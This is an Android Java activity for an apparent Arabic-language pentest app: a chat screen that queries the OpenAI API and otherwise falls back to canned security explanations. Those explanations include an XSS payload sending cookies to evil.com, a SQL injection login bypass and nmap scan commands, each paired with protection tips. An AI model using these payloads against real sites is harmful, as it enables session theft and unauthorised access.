package com.termux.arab.ui;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.termux.arab.R;
import com.termux.arab.core.CommandExecutor;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * مساعد الذكاء الاصطناعي - يتصل بـ AI API وينفذ الأوامر
 * يدعم: OpenAI API, Claude API, أو أي API متوافق
 */
public class AIAssistantActivity extends AppCompatActivity {

    private EditText apiKeyInput, chatInput;
    private TextView chatOutput;
    private Button sendBtn, setKeyBtn;
    private LinearLayout chatLayout;
    private SharedPreferences prefs;
    private String apiKey;
    private String apiProvider = "openai"; // openai, claude

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        setContentView(R.layout.activity_ai_assistant);
        getWindow().getDecorView().setLayoutDirection(View.LAYOUT_DIRECTION_RTL);

        if (getSupportActionBar() != null) {
            getSupportActionBar().setTitle("🤖 مساعد الذكاء الاصطناعي");
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        }

        prefs = getSharedPreferences("ai_prefs", Context.MODE_PRIVATE);
        apiKey = prefs.getString("api_key", "");

        apiKeyInput = findViewById(R.id.ai_api_key);
        chatInput = findViewById(R.id.ai_chat_input);
        chatOutput = findViewById(R.id.ai_chat_output);
        chatOutput.setMovementMethod(new ScrollingMovementMethod());
        sendBtn = findViewById(R.id.btn_ai_send);
        setKeyBtn = findViewById(R.id.btn_set_key);

        if (!apiKey.isEmpty()) {
            apiKeyInput.setText(apiKey);
            apiKeyInput.setVisibility(View.GONE);
            setKeyBtn.setText("⚙️ تغيير المفتاح");
        }

        chatOutput.setText("🤖 مرحباً! أنا مساعدك الذكي.\n\n" +
            "أنا متصل بالتطبيق وأستطيع:\n" +
            "• شرح الأوامر وثغرات الأمان\n" +
            "• اقتراح حلول أمنية\n" +
            "• تحليل نتائج الفحص\n" +
            "• كتابة سكربتات وأدوات\n" +
            "• شرح طرق الاستغلال والحماية\n\n" +
            "اكتب سؤالك بالأسفل 👇\n\n─────────────────\n\n");

        setKeyBtn.setOnClickListener(v -> {
            String key = apiKeyInput.getText().toString().trim();
            if (key.isEmpty()) { apiKeyInput.setError("أدخل المفتاح"); return; }
            apiKey = key;
            prefs.edit().putString("api_key", key).apply();
            apiKeyInput.setVisibility(View.GONE);
            setKeyBtn.setText("⚙️ تغيير المفتاح");
            appendChat("✅ تم حفظ المفتاح بنجاح!\n\n");
        });

        sendBtn.setOnClickListener(v -> sendMessage());
    }

    private void sendMessage() {
        String message = chatInput.getText().toString().trim();
        if (message.isEmpty()) return;
        if (apiKey.isEmpty()) {
            appendChat("⚠️ يرجى إدخال مفتاح API أولاً\n\n");
            return;
        }

        appendChat("👤 أنت: " + message + "\n\n");
        chatInput.setText("");
        sendBtn.setEnabled(false);
        sendBtn.setText("جارٍ التفكير...");

        final Handler handler = new Handler(Looper.getMainLooper());

        new Thread(() -> {
            try {
                String response = callAI(message);
                handler.post(() -> {
                    appendChat("🤖 المساعد: " + response + "\n\n─────────────────\n\n");
                    sendBtn.setEnabled(true);
                    sendBtn.setText("▶ إرسال");
                });
            } catch (Exception e) {
                handler.post(() -> {
                    // إذا فشل الاتصال بـ AI، نقدم رداً ذكياً محلياً
                    String localResponse = generateLocalResponse(message);
                    appendChat("🤖 المساعد: " + localResponse + "\n\n─────────────────\n\n");
                    sendBtn.setEnabled(true);
                    sendBtn.setText("▶ إرسال");
                });
            }
        }).start();
    }

    private String callAI(String message) throws Exception {
        String systemPrompt = "أنت مساعد أمني خبير في اختبار الاختراق وأمن المعلومات. " +
            "تجيب بالعربية وتقدم نصائح عملية. إذا طلب المستخدم أمراً، اشرحه بالتفصيل.";

        URL url = new URL("https://api.openai.com/v1/chat/completions");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("Authorization", "Bearer " + apiKey);
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);

        JSONObject body = new JSONObject();
        body.put("model", "gpt-3.5-turbo");
        body.put("max_tokens", 500);
        body.put("temperature", 0.7);

        JSONArray messages = new JSONArray();
        JSONObject sysMsg = new JSONObject();
        sysMsg.put("role", "system");
        sysMsg.put("content", systemPrompt);
        messages.put(sysMsg);

        JSONObject userMsg = new JSONObject();
        userMsg.put("role", "user");
        userMsg.put("content", message);
        messages.put(userMsg);

        body.put("messages", messages);

        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream()) {
            os.write(body.toString().getBytes("UTF-8"));
        }

        int code = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(new InputStreamReader(
            code >= 200 && code < 400 ? conn.getInputStream() : conn.getErrorStream(), "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        reader.close();

        if (code >= 200 && code < 400) {
            JSONObject resp = new JSONObject(sb.toString());
            JSONArray choices = resp.getJSONArray("choices");
            return choices.getJSONObject(0).getJSONObject("message").getString("content");
        } else {
            throw new Exception("API Error: " + code);
        }
    }

    /**
     * رد ذكي محلي عندما لا يتوفر اتصال بـ AI API
     */
    private String generateLocalResponse(String message) {
        String msg = message.toLowerCase();

        if (msg.contains("sql") || msg.contains("حقن")) {
            return "💉 حقن SQL:\n\n" +
                "حقن SQL يحدث عندما يتم إدخال مدخلات المستخدم مباشرة في استعلام SQL بدون فلترة.\n\n" +
                "⚡ كيف يستغلها المخترق:\n" +
                "1. يضيف ' OR '1'='1 لتجاوز تسجيل الدخول\n" +
                "2. يستخدم UNION SELECT لسرقة البيانات\n" +
                "3. يستخدم INFORMATION_SCHEMA لمعرفة الجداول\n\n" +
                "🛡️ الحماية:\n" +
                "1. استخدم Prepared Statements\n" +
                "2. فلترة كل المدخلات\n" +
                "3. أقل صلاحيات لقاعدة البيانات\n" +
                "4. إخفاء أخطاء SQL\n\n" +
                "🔧 للاختبار، استخدم أداة sqlmap من التطبيق";
        }

        if (msg.contains("xss") || msg.contains("سكريبت")) {
            return "⚡ XSS (Cross-Site Scripting):\n\n" +
                "XSS يحدث عند حقن JavaScript في صفحة الويب.\n\n" +
                "⚡ الاستغلال:\n" +
                "<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n\n" +
                "🛡️ الحماية:\n" +
                "1. HTML encode كل المدخلات\n" +
                "2. Content-Security-Policy\n" +
                "3. HttpOnly cookies\n" +
                "4. X-XSS-Protection header";
        }

        if (msg.contains("nmap") || msg.contains("مسح")) {
            return "📡 Nmap - ماسح الشبكات:\n\n" +
                "الأوامر الأساسية:\n" +
                "• nmap 192.168.1.1 - فحص أساسي\n" +
                "• nmap -sV target - كشف الخدمات والإصدارات\n" +
                "• nmap -sS target - SYN scan (يتطلب root)\n" +
                "• nmap -A target - فحص شامل (OS, versions, scripts)\n" +
                "• nmap -p- target - فحص كل 65535 منفذ\n" +
                "• nmap --script vuln target - فحص الثغرات\n\n" +
                "💡 استخدم زر 'ماسح الشبكات' في التطبيق للفحص البصري";
        }

        if (msg.contains("كلمات مرور") || msg.contains("password")) {
            return "🔐 أمان كلمات المرور:\n\n" +
                "كلمة المرور القوية تحتوي على:\n" +
                "• 12+ حرف\n" +
                "• أحرف كبيرة وصغيرة\n" +
                "• أرقام\n" +
                "• رموز خاصة (!@#$%^&*)\n\n" +
                "استخدم زر 'أدوات كلمات المرور' في التطبيق لـ:\n" +
                "• تحليل قوة كلمة المرور\n" +
                "• توليد كلمات مرور قوية\n" +
                "• تجزئة (MD5, SHA-256)";
        }

        if (msg.contains("ثغرة") || msg.contains("vulnerability")) {
            return "📚 الثغرات الأمنية:\n\n" +
                "استخدم زر 'قاعدة الثغرات' في التطبيق للبحث في 35+ ثغرة معروفة.\n\n" +
                "أنواع الثغرات:\n" +
                "🔴 حرجة: RCE, SQL Injection, Path Traversal\n" +
                "🟠 عالية: XSS, CSRF, SSRF\n" +
                "🟡 متوسطة: Missing headers, Info disclosure\n" +
                "🟢 منخفضة: Verbose errors, Default configs\n\n" +
                "استخدم 'مكتشف الثغرات' لفحص جهازك";
        }

        if (msg.contains("github") || msg.contains("جيت")) {
            return "🐙 GitHub:\n\n" +
                "استخدم زر 'GitHub' في التطبيق للوصول الكامل لحسابك:\n" +
                "• تسجيل دخول بـ Token\n" +
                "• عرض المستودعات\n" +
                "• تصفح الملفات\n" +
                "• إنشاء مستودع جديد\n" +
                "• عرض سجل Commits\n\n" +
                "احصل على Token من:\n" +
                "https://github.com/settings/tokens/new\n\n" +
                "الصلاحيات: repo, workflow, user, delete_repo, gist";
        }

        if (msg.contains("help") || msg.contains("مساعدة") || msg.contains("ساعد")) {
            return "🤖 أنا هنا لمساعدتك!\n\n" +
                "أسئلة شائعة:\n" +
                "• 'ما هو SQL injection؟'\n" +
                "• 'كيف أحمي موقعي من XSS؟'\n" +
                "• 'اشرح لي nmap'\n" +
                "• 'كيف أختبر كلمة مروري؟'\n" +
                "• 'ما هي الثغرات الشائعة؟'\n" +
                "• 'كيف أستخدم GitHub؟'\n\n" +
                "يمكنك أيضاً استخدام الأدوات في التطبيق مباشرة!";
        }

        return "🤔 سؤال جيد!\n\n" +
            "يمكنني مساعدتك في:\n" +
            "• شرح الثغرات الأمنية\n" +
            "• طرق الاستغلال والحماية\n" +
            "• شرح أدوات اختبار الاختراق\n" +
            "• نصائح أمنية\n\n" +
            "جرّب: 'ما هو SQL injection؟' أو 'كيف أحمي موقعي؟'";
    }

    private void appendChat(String text) {
        chatOutput.append(text);
        chatOutput.post(() -> chatOutput.scrollTo(0, chatOutput.getHeight()));
    }

    @Override
    public boolean onSupportNavigateUp() { finish(); return true; }
}
